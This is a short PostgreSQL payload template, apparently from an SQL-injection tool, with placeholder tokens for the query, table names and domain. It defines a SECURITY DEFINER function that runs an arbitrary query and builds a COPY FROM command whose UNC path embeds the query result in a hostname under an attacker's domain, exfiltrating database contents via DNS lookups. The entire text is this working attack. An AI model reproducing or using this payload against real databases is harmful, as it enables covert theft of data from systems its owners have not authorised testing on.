DROP TABLE IF EXISTS %RANDSTR1%;
CREATE TABLE %RANDSTR1%(%RANDSTR2% text);
CREATE OR REPLACE FUNCTION %RANDSTR3%()
RETURNS VOID AS $$
DECLARE %RANDSTR4% TEXT;
DECLARE %RANDSTR5% TEXT;
BEGIN
SELECT INTO %RANDSTR5% (%QUERY%);
%RANDSTR4% := E'COPY %RANDSTR1%(%RANDSTR2%) FROM E\'\\\\\\\\%PREFIX%.'||%RANDSTR5%||E'.%SUFFIX%.%DOMAIN%\\\\%RANDSTR6%\'';
EXECUTE %RANDSTR4%;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT %RANDSTR3%();